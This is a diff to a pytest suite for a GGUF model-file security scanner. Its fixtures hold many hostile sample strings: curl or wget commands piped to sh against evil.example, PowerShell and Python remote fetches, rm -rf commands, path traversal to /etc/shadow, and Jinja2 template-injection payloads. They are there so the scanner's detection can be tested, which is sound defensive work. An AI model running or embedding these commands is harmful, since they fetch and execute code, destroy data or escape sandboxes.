@@ -1,24 +1,35 @@
 """Comprehensive tests for the GGUF scanner."""
 
+import json
 import struct
+import sys
+import time
+import zipfile
 from pathlib import Path
 from typing import Any
 
 import pytest
+from click.testing import CliRunner
 
 from modelaudit.cache import get_cache_manager, reset_cache_manager
+from modelaudit.cli import cli
 from modelaudit.config import ModelAuditConfig, reset_config, set_config
 from modelaudit.core import determine_exit_code, scan_model_directory_or_file
 from modelaudit.rules import Severity
 from modelaudit.scanners.base import DEFAULT_MAX_FILE_READ_SIZE, INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
 from modelaudit.scanners.gguf_scanner import (
+    _GGUF_REMOTE_URL_POSITION_LIMIT,
     GGUF_DUPLICATE_METADATA_INCONCLUSIVE_REASON,
     GGUF_METADATA_LIMIT_INCONCLUSIVE_REASON,
     GGUF_PARSE_INCONCLUSIVE_REASON,
+    GGUF_STRUCTURE_INCONCLUSIVE_REASON,
     GGUF_TENSOR_LIMIT_INCONCLUSIVE_REASON,
     GgufScanner,
 )
+from tests.cli_output import parse_click_json_output
 from tests.helpers import create_mock_gguf
+
+_RANK_262_TOKENIZER_ITEM_COUNT = 262_144
 
 
 def _write_minimal_gguf(path, n_kv=1, n_tensors=0, kv_key=b"test", kv_value=b"val"):
@@ -94,25 +105,61 @@ def _write_ggml_variant_file(path, magic):
         f.write(b"\0" * 24)
 
 
-def _write_gguf_with_tensor_type(path: Path, tensor_type: int) -> None:
+def _write_gguf_with_tensor_type(
+    path: Path,
+    tensor_type: int,
+    *,
+    tensor_name: bytes = b"unknown",
+    dims: tuple[int, ...] = (8,),
+    tensor_data_size: int = 32,
+) -> None:
     with path.open("wb") as f:
         f.write(b"GGUF")
         f.write(struct.pack("<I", 3))
         f.write(struct.pack("<Q", 1))
         f.write(struct.pack("<Q", 0))
 
-        name = b"unknown"
-        f.write(struct.pack("<Q", len(name)))
-        f.write(name)
-        f.write(struct.pack("<I", 1))
-        f.write(struct.pack("<Q", 8))
+        f.write(struct.pack("<Q", len(tensor_name)))
+        f.write(tensor_name)
+        f.write(struct.pack("<I", len(dims)))
+        for dimension in dims:
+            f.write(struct.pack("<Q", dimension))
         f.write(struct.pack("<I", tensor_type))
         f.write(struct.pack("<Q", 0))
 
         pad_to_tensor_data = (32 - (f.tell() % 32)) % 32
         if pad_to_tensor_data:
             f.write(b"\0" * pad_to_tensor_data)
-        f.write(b"\0" * 32)
+        f.write(b"\0" * tensor_data_size)
+
+
+def _write_gguf_with_tensor_records(
+    path: Path,
+    records: list[tuple[bytes, int, tuple[int, ...], int]],
+) -> None:
+    with path.open("wb") as f:
+        f.write(b"GGUF")
+        f.write(struct.pack("<I", 3))
+        f.write(struct.pack("<Q", len(records)))
+        f.write(struct.pack("<Q", 0))
+
+        offset = 0
+        for tensor_name, tensor_type, dims, tensor_data_size in records:
+            f.write(struct.pack("<Q", len(tensor_name)))
+            f.write(tensor_name)
+            f.write(struct.pack("<I", len(dims)))
+            for dimension in dims:
+                f.write(struct.pack("<Q", dimension))
+            f.write(struct.pack("<I", tensor_type))
+            f.write(struct.pack("<Q", offset))
+            offset += tensor_data_size
+
+        pad_to_tensor_data = (32 - (f.tell() % 32)) % 32
+        if pad_to_tensor_data:
+            f.write(b"\0" * pad_to_tensor_data)
+
+        for _tensor_name, _tensor_type, _dims, tensor_data_size in records:
+            f.write(b"\0" * tensor_data_size)
 
 
 def _write_gguf_string_metadata_entries(
@@ -164,6 +211,54 @@ def _encode_gguf_array(subtype: int, values: bytes, count: int) -> bytes:
     return struct.pack("<IQ", subtype, count) + values
 
 
+def _encode_gguf_string_array(prefix: str, count: int) -> bytes:
+    return b"".join(_encode_gguf_string(f"{prefix}-{index}") for index in range(count))
+
+
+def _encode_gguf_float32_array(count: int) -> bytes:
+    return b"".join(struct.pack("<f", float(index % 997)) for index in range(count))
+
+
+def _write_rank_262_shaped_tokenizer_gguf(path: Path) -> None:
+    _write_gguf_raw_metadata_entries(
+        path,
+        [
+            (
+                "tokenizer.ggml.tokens",
+                9,
+                _encode_gguf_array(
+                    8,
+                    _encode_gguf_string_array("token", _RANK_262_TOKENIZER_ITEM_COUNT),
+                    _RANK_262_TOKENIZER_ITEM_COUNT,
+                ),
+            ),
+            (
+                "tokenizer.ggml.merges",
+                9,
+                _encode_gguf_array(
+                    8,
+                    _encode_gguf_string_array("merge", _RANK_262_TOKENIZER_ITEM_COUNT),
+                    _RANK_262_TOKENIZER_ITEM_COUNT,
+                ),
+            ),
+            (
+                "tokenizer.ggml.scores",
+                9,
+                _encode_gguf_array(
+                    6,
+                    _encode_gguf_float32_array(_RANK_262_TOKENIZER_ITEM_COUNT),
+                    _RANK_262_TOKENIZER_ITEM_COUNT,
+                ),
+            ),
+            (
+                "tokenizer.chat_template",
+                8,
+                _encode_gguf_string("{% for message in messages %}{{ message['content'] }}{% endfor %}"),
+            ),
+        ],
+    )
+
+
 def _single_file_metadata(aggregate: Any) -> Any:
     return next(iter(aggregate.file_metadata.values()))
 
@@ -179,6 +274,14 @@ def _assert_inconclusive_exit2(aggregate: Any, reason: str) -> None:
 
 def _assert_no_warning_or_critical_issues(result: Any) -> None:
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+
+
+def _failed_metadata_value_checks(result: Any) -> list[Any]:
+    return [
+        check
+        for check in result.checks
+        if check.name == "Metadata Value Security Check" and check.status == CheckStatus.FAILED
+    ]
 
 
 def _assert_uncached_rerun_preserves_inconclusive_exit2(
@@ -810,7 +913,36 @@ def test_gguf_scanner_fails_closed_on_oversized_chat_templates(tmp_path: Path) -
         for check in direct.checks
     )
     assert not any(check.name == "Jinja2 SSTI Analysis" for check in direct.checks)
+    assert _failed_metadata_value_checks(direct) == []
     _assert_inconclusive_exit2(aggregate, "jinja2_template_size_limit_exceeded")
+
+
+@pytest.mark.parametrize(
+    ("payload", "expected_pattern"),
+    [
+        ("{{ ''.__class__.__mro__[1].__subclasses__() }}", "jinja2_object_traversal"),
+        ("{{ request|attr('__class__') }}", "jinja2_obfuscation"),
+    ],
+)
+def test_gguf_oversized_chat_template_with_ssti_primitive_keeps_metadata_evidence(
+    tmp_path: Path,
+    payload: str,
+    expected_pattern: str,
+) -> None:
+    template = payload + ("{{ content }}" * 100)
+    path = create_mock_gguf(
+        tmp_path / "large-malicious-template.gguf",
+        metadata={"tokenizer.chat_template": template},
+    )
+
+    result = GgufScanner(config={"max_template_size": 64}).scan(str(path))
+
+    checks = _failed_metadata_value_checks(result)
+    assert any(
+        check.details["evidence_type"] == "template_injection" and check.details["pattern"] == expected_pattern
+        for check in checks
+    )
+    assert any(check.name == "Template Size Limit" and check.status == CheckStatus.FAILED for check in result.checks)
 
 
 def test_gguf_scanner_propagates_jinja_sandbox_budget_inconclusive(tmp_path: Path) -> None:
@@ -1018,9 +1150,206 @@ def test_gguf_unknown_tensor_type_is_inconclusive(tmp_path: Path) -> None:
     assert direct.success is False
     assert direct.has_errors is False
     assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
-    assert "gguf_structure_validation_failed" in direct.metadata["scan_outcome_reasons"]
+    assert GGUF_STRUCTURE_INCONCLUSIVE_REASON in direct.metadata["scan_outcome_reasons"]
+    type_checks = [check for check in direct.checks if check.name == "Tensor Type Validation"]
+    assert len(type_checks) == 1
+    assert type_checks[0].status == CheckStatus.FAILED
+    assert type_checks[0].details["tensor_type"] == 999
+    assert type_checks[0].details["tensor_name"] == "unknown"
     assert any("unknown ggml type" in issue.message.lower() for issue in direct.issues)
+    _assert_no_warning_or_critical_issues(direct)
     assert determine_exit_code(aggregate) == 2
+
+
+def test_gguf_bf16_tensor_type_30_is_supported(tmp_path: Path) -> None:
+    path = tmp_path / "bf16_tensor_type30.gguf"
+    _write_gguf_with_tensor_type(
+        path,
+        tensor_type=30,
+        tensor_name=b"bf16_weight",
+        tensor_data_size=16,
+    )
+
+    result = GgufScanner().scan(str(path))
+    aggregate = scan_model_directory_or_file(str(path), cache_enabled=False)
+
+    assert result.success is True
+    assert result.metadata["tensors"] == [{"name": "bf16_weight", "type": 30, "dims": [8]}]
+    assert not any(check.name == "Tensor Type Validation" for check in result.checks)
+    assert not any("unknown ggml type" in issue.message.lower() for issue in result.issues)
+    assert not any(check.name == "Tensor Data Bounds Check" for check in result.checks)
+    _assert_no_warning_or_critical_issues(result)
+    assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize(
+    ("tensor_type", "tensor_name", "tensor_data_size"),
+    [
+        (21, b"blk.0.ffn_down.weight.iq3_s", 110),
+        (23, b"blk.0.ffn_up.weight.iq4_xs", 136),
+    ],
+)
+def test_gguf_rank250_iq_tensor_types_are_supported(
+    tmp_path: Path,
+    tensor_type: int,
+    tensor_name: bytes,
+    tensor_data_size: int,
+) -> None:
+    path = tmp_path / f"rank250_type{tensor_type}.gguf"
+    _write_gguf_with_tensor_type(
+        path,
+        tensor_type=tensor_type,
+        tensor_name=tensor_name,
+        dims=(256,),
+        tensor_data_size=tensor_data_size,
+    )
+
+    direct = GgufScanner().scan(str(path))
+    aggregate = scan_model_directory_or_file(str(path), cache_enabled=False)
+
+    assert direct.success is True
+    assert direct.metadata["tensors"] == [{"name": tensor_name.decode(), "type": tensor_type, "dims": [256]}]
+    assert not any(check.name == "Tensor Type Validation" for check in direct.checks)
+    assert not any("unknown ggml type" in issue.message.lower() for issue in direct.issues)
+    assert not any(check.name == "Tensor Data Bounds Check" for check in direct.checks)
+    _assert_no_warning_or_critical_issues(direct)
+    assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize(
+    ("tensor_type", "tensor_name", "expected_size"),
+    [
+        (21, b"iq3_s_truncated", 110),
+        (23, b"iq4_xs_truncated", 136),
+    ],
+)
+def test_gguf_rank250_iq_tensor_types_reach_bounds_validation(
+    tmp_path: Path,
+    tensor_type: int,
+    tensor_name: bytes,
+    expected_size: int,
+) -> None:
+    path = tmp_path / f"rank250_type{tensor_type}_truncated.gguf"
+    _write_gguf_with_tensor_type(
+        path,
+        tensor_type=tensor_type,
+        tensor_name=tensor_name,
+        dims=(256,),
+        tensor_data_size=expected_size - 1,
+    )
+
+    direct = GgufScanner().scan(str(path))
+    aggregate = scan_model_directory_or_file(str(path), cache_enabled=False)
+
+    assert not any(check.name == "Tensor Type Validation" for check in direct.checks)
+    bounds_checks = [check for check in direct.checks if check.name == "Tensor Data Bounds Check"]
+    assert len(bounds_checks) == 1
+    assert bounds_checks[0].status == CheckStatus.FAILED
+    assert bounds_checks[0].details["tensor_name"] == tensor_name.decode()
+    assert bounds_checks[0].details["expected"] == expected_size
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_gguf_rank250_mixed_current_tensor_types_are_supported(tmp_path: Path) -> None:
+    path = tmp_path / "rank250_current_types.gguf"
+    _write_gguf_with_tensor_records(
+        path,
+        [
+            (b"blk.0.attn_q.weight.iq3_s", 21, (256,), 110),
+            (b"blk.0.attn_k.weight.iq4_xs", 23, (256,), 136),
+            (b"blk.0.ffn_norm.weight.bf16", 30, (8,), 16),
+        ],
+    )
+
+    direct = GgufScanner().scan(str(path))
+    aggregate = scan_model_directory_or_file(str(path), cache_enabled=False)
+
+    assert direct.success is True
+    assert direct.metadata["tensors"] == [
+        {"name": "blk.0.attn_q.weight.iq3_s", "type": 21, "dims": [256]},
+        {"name": "blk.0.attn_k.weight.iq4_xs", "type": 23, "dims": [256]},
+        {"name": "blk.0.ffn_norm.weight.bf16", "type": 30, "dims": [8]},
+    ]
+    assert not any(check.name == "Tensor Type Validation" for check in direct.checks)
+    assert not any("unknown ggml type" in issue.message.lower() for issue in direct.issues)
+    _assert_no_warning_or_critical_issues(direct)
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_gguf_rank250_current_types_do_not_mask_unknown_future_type(tmp_path: Path) -> None:
+    path = tmp_path / "rank250_current_plus_unknown.gguf"
+    _write_gguf_with_tensor_records(
+        path,
+        [
+            (b"blk.0.attn_q.weight.iq3_s", 21, (256,), 110),
+            (b"blk.0.attn_k.weight.iq4_xs", 23, (256,), 136),
+            (b"blk.0.ffn_norm.weight.bf16", 30, (8,), 16),
+            (b"blk.0.future.weight", 999, (8,), 32),
+        ],
+    )
+
+    direct = GgufScanner().scan(str(path))
+    aggregate = scan_model_directory_or_file(str(path), cache_enabled=False)
+
+    assert direct.success is False
+    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert GGUF_STRUCTURE_INCONCLUSIVE_REASON in direct.metadata["scan_outcome_reasons"]
+    type_checks = [check for check in direct.checks if check.name == "Tensor Type Validation"]
+    assert len(type_checks) == 1
+    assert type_checks[0].details["tensor_type"] == 999
+    assert type_checks[0].details["tensor_name"] == "blk.0.future.weight"
+    assert any("unknown ggml type 999" in issue.message.lower() for issue in direct.issues)
+    _assert_no_warning_or_critical_issues(direct)
+    assert determine_exit_code(aggregate) == 2
+
+
+def test_gguf_bf16_truncated_tensor_data_reports_bounds_check(tmp_path: Path) -> None:
+    path = tmp_path / "bf16_truncated_tensor_data.gguf"
+    _write_gguf_with_tensor_type(
+        path,
+        tensor_type=30,
+        tensor_name=b"bf16_truncated",
+        tensor_data_size=8,
+    )
+
+    direct = GgufScanner().scan(str(path))
+    aggregate = scan_model_directory_or_file(str(path), cache_enabled=False)
+
+    assert not any(check.name == "Tensor Type Validation" for check in direct.checks)
+    bounds_checks = [check for check in direct.checks if check.name == "Tensor Data Bounds Check"]
+    assert len(bounds_checks) == 1
+    assert bounds_checks[0].status == CheckStatus.FAILED
+    assert bounds_checks[0].details["tensor_name"] == "bf16_truncated"
+    assert bounds_checks[0].details["expected"] == 16
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_gguf_truncated_tensor_dimensions_are_parse_inconclusive(tmp_path: Path) -> None:
+    path = tmp_path / "truncated_tensor_dimensions.gguf"
+    with path.open("wb") as f:
+        f.write(b"GGUF")
+        f.write(struct.pack("<I", 3))
+        f.write(struct.pack("<Q", 1))
+        f.write(struct.pack("<Q", 0))
+        name = b"truncated_dims"
+        f.write(struct.pack("<Q", len(name)))
+        f.write(name)
+        f.write(struct.pack("<I", 2))
+        f.write(struct.pack("<Q", 8))
+
+    direct = GgufScanner().scan(str(path))
+    aggregate = scan_model_directory_or_file(str(path), cache_enabled=False)
+
+    assert direct.success is False
+    assert "tensors" not in direct.metadata
+    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert GGUF_PARSE_INCONCLUSIVE_REASON in direct.metadata["scan_outcome_reasons"]
+    parse_checks = [check for check in direct.checks if check.name == "GGUF Tensor Parsing"]
+    assert len(parse_checks) == 1
+    assert parse_checks[0].status == CheckStatus.FAILED
+    assert parse_checks[0].details["error_type"] in {"error", "ValueError"}
+    _assert_no_warning_or_critical_issues(direct)
+    _assert_inconclusive_exit2(aggregate, GGUF_PARSE_INCONCLUSIVE_REASON)
 
 
 def test_gguf_unknown_tensor_type_uncached_rerun_preserves_exit2(
@@ -1032,11 +1361,11 @@ def test_gguf_unknown_tensor_type_uncached_rerun_preserves_exit2(
     _assert_uncached_rerun_preserves_inconclusive_exit2(
         path,
         tmp_path / "cache",
-        "gguf_structure_validation_failed",
+        GGUF_STRUCTURE_INCONCLUSIVE_REASON,
     )
 
 
-def test_gguf_scanner_suspicious_key_paths(tmp_path):
+def test_gguf_scanner_suspicious_key_paths(tmp_path: Path) -> None:
     """Test detection of suspicious key names with path traversal."""
     path = tmp_path / "suspicious.gguf"
     _write_minimal_gguf(path, kv_key=b"../../../etc/passwd", kv_value=b"root")
@@ -1045,13 +1374,719 @@ def test_gguf_scanner_suspicious_key_paths(tmp_path):
     assert any("path traversal" in i.message.lower() for i in result.issues)
 
 
-def test_gguf_scanner_suspicious_values(tmp_path):
+def test_gguf_scanner_suspicious_values(tmp_path: Path) -> None:
     """Test detection of suspicious metadata values."""
     path = tmp_path / "suspicious.gguf"
     _write_minimal_gguf(path, kv_key=b"command", kv_value=b"rm -rf /")
 
     result = GgufScanner().scan(str(path))
     assert any("suspicious" in i.message.lower() for i in result.issues)
+    checks = _failed_metadata_value_checks(result)
+    assert checks[0].details["evidence_type"] == "command_execution"
+
+
+@pytest.mark.parametrize(
+    ("key", "value"),
+    [
+        ("general.base_model.0.repo_url", "https://huggingface.co/google/gemma-4-12B-it"),
+        ("general.license.url", "https://www.apache.org/licenses/LICENSE-2.0"),
+        ("general.description", "repository/name | tokenizer/model vocabulary path"),
+        (
+            "tokenizer.chat_template",
+            "{% for message in messages %}{{ '<|turn>' + message['role'] + '\\n' }}"
+            "{{ message['content'] | trim }}<turn|>\n{% endfor %}",
+        ),
+    ],
+)
+def test_gguf_metadata_punctuation_urls_and_chat_templates_do_not_create_s902(
+    tmp_path: Path,
+    key: str,
+    value: str,
+) -> None:
+    path = create_mock_gguf(tmp_path / "benign-metadata.gguf", metadata={key: value})
+
+    result = GgufScanner().scan(str(path))
+
+    assert _failed_metadata_value_checks(result) == []
+    assert not any("Suspicious metadata value" in issue.message for issue in result.issues)
+
+
+def test_gguf_metadata_key_slashes_without_traversal_are_not_flagged(tmp_path: Path) -> None:
+    path = create_mock_gguf(tmp_path / "key-slash.gguf", metadata={"repository/url": "local mirror"})
+
+    result = GgufScanner().scan(str(path))
+
+    assert not [
+        check
+        for check in result.checks
+        if check.name == "Metadata Key Security Check" and check.status == CheckStatus.FAILED
+    ]
+
+
+@pytest.mark.parametrize(
+    ("key", "value", "evidence_type"),
+    [
+        ("command", "rm -rf /tmp/model-cache", "command_execution"),
+        ("command", "rm -rf ./model-cache", "command_execution"),
+        ("command", "rm -rf model-cache", "command_execution"),
+        ("command", "rm -r -f /tmp/model-cache", "command_execution"),
+        ("command", "rm /tmp/model-cache -rf", "command_execution"),
+        ("command", "sudo rm -rf /tmp/model-cache", "command_execution"),
+        ("command", "sudo rm /tmp/model-cache -r -f", "command_execution"),
+        ("command", "sudo -u nobody rm -rf /tmp/model-cache", "command_execution"),
+        ("command", "timeout 5 rm -rf /tmp/model-cache", "command_execution"),
+        ("loader", "eval('1 + 1')", "command_execution"),
+        ("loader", "subprocess.run(['id'])", "command_execution"),
+        ("loader", "env bash -c 'curl https://evil.example/payload.sh'", "command_execution"),
+        ("payload_path", "../tmp/../../payload.bin", "path_traversal"),
+        ("encoded_payload", "%2E%2e/%2e%2e/etc/shadow", "path_traversal"),
+        ("encoded_payload", "..%25252Fetc%25252Fshadow", "path_traversal"),
+        ("download", "wget https://evil.example/payload.sh -O /tmp/payload.sh", "remote_fetch"),
+        ("download", "/usr/bin/wget https://evil.example/payload.sh -O /tmp/payload.sh", "remote_fetch"),
+        ("download", "curl -o /tmp/payload.sh https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "curl -o- https://evil.example/payload.sh | sh", "remote_fetch"),
+        ("download", "curl --output /tmp/payload.sh https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "curl -f https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "curl -O https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "curl -K /tmp/curlrc https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "curl --config /tmp/curlrc https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "curl -fO https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "curl -sSfK /tmp/curlrc -O https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "curl -fsSLo /tmp/payload.sh https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "curl --url https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "curl --connect-timeout 5 https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "curl --proto '=https' --tlsv1.2 -sSf https://evil.example/install.sh | sh", "remote_fetch"),
+        ("download", "curl -X POST https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "curl --request POST https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "fetch https://evil/p", "remote_fetch"),
+        ("download", "Invoke-RestMethod https://evil/p", "remote_fetch"),
+        ("download", "Invoke-WebRequest -OutFile /tmp/p https://evil.example/p", "remote_fetch"),
+        ("download", "Invoke-WebRequest -Headers @{'A'='B'} https://evil.example/p", "remote_fetch"),
+        ("download", "Invoke-WebRequest -Headers @{ 'A' = 'B' } https://evil.example/p", "remote_fetch"),
+        ("download", "Invoke-WebRequest -Method Get https://evil/p", "remote_fetch"),
+        ("download", "irm -Headers @{'A'='B'} https://evil.example/p", "remote_fetch"),
+        ("download", "irm -Headers @{ 'A' = 'B' } https://evil.example/p", "remote_fetch"),
+        ("download", "irm https://evil/p", "remote_fetch"),
+        ("download", 'url=https://evil/p curl "$url"', "remote_fetch"),
+        ("download", 'url=https://evil.example/payload.sh; curl "$url"', "remote_fetch"),
+        ("download", "payload_url='https://evil.example/payload.sh'; wget ${payload_url}", "remote_fetch"),
+        ("download", "curl${IFS}https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "```bash\ncurl https://evil.example/payload.sh\n```", "remote_fetch"),
+        ("download", "/usr/bin/curl https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "curl -H 'Authorization: Bearer token' https://evil.example/payload.sh", "remote_fetch"),
+        ("loader", "/bin/bash -c 'curl https://evil.example/payload.sh'", "command_execution"),
+        ("callback", "requests.get('https://evil.example/payload')", "remote_fetch"),
+        ("callback", "requests.delete('https://evil.example/payload')", "remote_fetch"),
+        ("callback", 'requests.get(url="https://evil.example/payload")', "remote_fetch"),
+        ("callback", 'url = "https://evil.example/payload"; requests.get(url)', "remote_fetch"),
+        ("callback", "httpx.get('https://evil.example/payload')", "remote_fetch"),
+        ("callback", 'httpx.request("GET", url="https://evil.example/payload")', "remote_fetch"),
+        ("callback", "requests.get(headers=dict(), url='https://evil.example/payload')", "remote_fetch"),
+        ("callback", "from requests import get; get('https://evil.example/payload')", "remote_fetch"),
+        ("callback", "from requests import get as rg; rg('https://evil.example/payload')", "remote_fetch"),
+        ("callback", "import requests as r; r.get('https://evil.example/payload')", "remote_fetch"),
+        ("callback", "import httpx as hx; hx.stream('GET', 'https://evil.example/payload')", "remote_fetch"),
+        ("callback", "urllib.request.urlretrieve('https://evil.example/payload', '/tmp/payload')", "remote_fetch"),
+        ("callback", "import urllib.request as ureq; ureq.urlretrieve('https://evil.example/payload')", "remote_fetch"),
+        ("callback", "from urllib import request as ur; ur.urlopen('https://evil.example/payload')", "remote_fetch"),
+        ("callback", "urlretrieve('https://evil.example/payload', '/tmp/payload')", "remote_fetch"),
+        ("callback", "window.fetch('https://evil.example/payload')", "remote_fetch"),
+        ("general.description", "example: curl https://evil.example/payload.sh", "remote_fetch"),
+        ("general.description", "Example:\n```bash\ncurl https://evil.example/payload.sh\n```", "remote_fetch"),
+        ("general.description", "timeout 5 bash -c 'curl https://evil.example/p'", "command_execution"),
+        (
+            "general.description",
+            "Example:\n```bash\ncurl https://huggingface.co/org/model/resolve/main/install.sh | sh\n```",
+            "remote_fetch",
+        ),
+        (
+            "general.description",
+            "Example:\n```bash\ncurl https://huggingface.co/org/model/resolve/main/install.sh | env sh\n```",
+            "remote_fetch",
+        ),
+        (
+            "general.description",
+            "Example:\n```bash\ncurl https://huggingface.co/org/model/resolve/main/install.sh | sudo -u nobody sh\n```",
+            "remote_fetch",
+        ),
+        ("general.description", "# Model\nDocumentation:\ncurl https://evil.example/payload.sh | sh", "remote_fetch"),
+        ("general.description", "# Model\n## Usage\n> docs\nrm -rf /tmp/model-cache", "command_execution"),
+        ("general.description", "# Model\n## Usage\n> docs\nrm\t-rf /tmp/model-cache", "command_execution"),
+        (
+            "general.description",
+            "# Model\n## Usage\n> docs\nrm${IFS}-rf${IFS}/tmp/model-cache",
+            "command_execution",
+        ),
+        (
+            "general.description",
+            "# Model\n## Usage\n> documented setup\n> optional fetch\nurl='https://evil.example/p'\nrequests.delete(url)",
+            "remote_fetch",
+        ),
+        (
+            "general.description",
+            "# Model\n## Usage\n> documented setup\n> optional fetch\nurl=https://evil.example/p\ncurl $url",
+            "remote_fetch",
+        ),
+    ],
+)
+def test_gguf_metadata_value_requires_concrete_security_evidence(
+    tmp_path: Path,
+    key: str,
+    value: str,
+    evidence_type: str,
+) -> None:
+    path = create_mock_gguf(tmp_path / "concrete-evidence.gguf", metadata={key: value})
+
+    result = GgufScanner().scan(str(path))
+
+    checks = _failed_metadata_value_checks(result)
+    assert checks
+    assert any(check.details["evidence_type"] == evidence_type for check in checks)
+    assert all(check.rule_code == "S902" for check in checks)
+
+
+def test_gguf_metadata_remote_fetch_detects_url_assignment_after_many_benign_urls(tmp_path: Path) -> None:
+    benign_assignments = "\n".join(f"u{index} = 'https://example.invalid/{index}'" for index in range(64))
+    value = f"{benign_assignments}\ntarget = 'https://evil.example/payload'\nrequests.delete(target)"
+    path = create_mock_gguf(tmp_path / "capped-url-assignments.gguf", metadata={"callback": value})
+
+    result = GgufScanner().scan(str(path))
+
+    checks = _failed_metadata_value_checks(result)
+    assert checks
+    assert any(check.details["evidence_type"] == "remote_fetch" for check in checks)
+    assert all(check.rule_code == "S902" for check in checks)
+
+
+def test_gguf_metadata_remote_fetch_detects_alias_after_many_benign_aliases(tmp_path: Path) -> None:
+    benign_aliases = "\n".join(f"import requests as r{index}" for index in range(8))
+    value = f"{benign_aliases}\nimport requests as target_client\ntarget_client.delete('https://evil.example/payload')"
+    path = create_mock_gguf(tmp_path / "capped-client-aliases.gguf", metadata={"callback": value})
+
+    result = GgufScanner().scan(str(path))
+
+    checks = _failed_metadata_value_checks(result)
+    assert checks
+    assert any(check.details["evidence_type"] == "remote_fetch" for check in checks)
+    assert all(check.rule_code == "S902" for check in checks)
+
+
+def test_gguf_metadata_remote_fetch_detects_alias_after_truncated_alias_window(tmp_path: Path) -> None:
+    benign_aliases = "\n".join(f"import requests as r{index}" for index in range(20))
+    value = f"{benign_aliases}\nimport requests as target_client\ntarget_client.delete('https://evil.example/payload')"
+    path = create_mock_gguf(tmp_path / "truncated-client-aliases.gguf", metadata={"callback": value})
+
+    result = GgufScanner().scan(str(path))
+
+    checks = _failed_metadata_value_checks(result)
+    assert checks
+    assert any(check.details["evidence_type"] == "remote_fetch" for check in checks)
+    assert all(check.rule_code == "S902" for check in checks)
+
+
+def test_gguf_metadata_remote_fetch_detects_later_alias_after_benign_omitted_alias(tmp_path: Path) -> None:
+    benign_aliases = "\n".join(f"import requests as r{index}" for index in range(8))
+    value = (
+        f"{benign_aliases}\n"
+        "import requests as benign_client\n"
+        "import requests as target_client\n"
+        "target_client.delete('https://evil.example/payload')"
+    )
+    path = create_mock_gguf(tmp_path / "capped-later-client-alias.gguf", metadata={"callback": value})
+
+    result = GgufScanner().scan(str(path))
+
+    checks = _failed_metadata_value_checks(result)
+    assert checks
+    assert any(check.details["evidence_type"] == "remote_fetch" for check in checks)
+    assert all(check.rule_code == "S902" for check in checks)
+
+
+def test_gguf_metadata_remote_fetch_detects_function_alias_after_many_benign_aliases(tmp_path: Path) -> None:
+    benign_aliases = "\n".join(f"import requests as r{index}" for index in range(8))
+    value = (
+        f"{benign_aliases}\nfrom requests import delete as target_delete\ntarget_delete('https://evil.example/payload')"
+    )
+    path = create_mock_gguf(tmp_path / "capped-function-aliases.gguf", metadata={"callback": value})
+
+    result = GgufScanner().scan(str(path))
+
+    checks = _failed_metadata_value_checks(result)
+    assert checks
+    assert any(check.details["evidence_type"] == "remote_fetch" for check in checks)
+    assert all(check.rule_code == "S902" for check in checks)
+
+
+@pytest.mark.parametrize(
+    "value_suffix",
+    [
+        "logger.info('https://evil.example/not-a-fetch')",
+        "from requests import delete as benign_delete\nrender_link('https://evil.example/not-a-fetch')",
+    ],
+)
+def test_gguf_metadata_remote_fetch_alias_cap_non_network_calls_stay_clean(value_suffix: str) -> None:
+    benign_aliases = "\n".join(f"import requests as r{index}" for index in range(8))
+    value = f"{benign_aliases}\n{value_suffix}"
+
+    evidence = GgufScanner._metadata_value_security_evidence("callback", value)
+
+    assert evidence == []
+
+
+def test_gguf_metadata_remote_fetch_truncated_alias_non_network_calls_stay_clean() -> None:
+    benign_aliases = "\n".join(f"import requests as r{index}" for index in range(20))
+    value = f"{benign_aliases}\nmodel.delete('https://evil.example/not-a-fetch')"
+
+    evidence = GgufScanner._metadata_value_security_evidence("callback", value)
+
+    assert evidence == []
+
+
+def test_gguf_metadata_remote_fetch_truncated_alias_wrong_method_stays_clean() -> None:
+    benign_aliases = "\n".join(f"import requests as r{index}" for index in range(20))
+    value = (
+        f"{benign_aliases}\nimport urllib.request as url_client\nurl_client.delete('https://evil.example/not-a-fetch')"
+    )
+
+    evidence = GgufScanner._metadata_value_security_evidence("callback", value)
+
+    assert evidence == []
+
+
+def test_gguf_metadata_fetch_command_words_in_prose_are_not_remote_fetch() -> None:
+    value = "curl examples are documented at https://huggingface.co/docs/hub/security"
+
+    evidence = GgufScanner._metadata_value_security_evidence("general.description", value)
+
+    assert evidence == []
+
+
+@pytest.mark.parametrize(
+    "value",
+    [
+        "the prefetch('https://huggingface.co/docs') example is documentation",
+        "url=https://huggingface.co/org/model; curl examples are listed below",
+        "url=https://huggingface.co/org/model; curl url",
+        "url=https://huggingface.co/org/model; curl $url_suffix",
+        "author\x00metadata https://huggingface.co/org/model",
+        "Authorization: Bearer token\nX-Repo: https://huggingface.co/org/model",
+        ("Model card usage example:\n```bash\ncurl https://huggingface.co/org/model/resolve/main/model.gguf\n```\n"),
+        (
+            "Repository instructions:\n"
+            "```python\n"
+            "requests.get('https://huggingface.co/org/model/raw/main/README.md')\n"
+            "```\n"
+        ),
+    ],
+)
+def test_gguf_metadata_remote_fetch_near_matches_stay_clean(value: str) -> None:
+    evidence = GgufScanner._metadata_value_security_evidence("general.description", value)
+
+    assert evidence == []
+
+
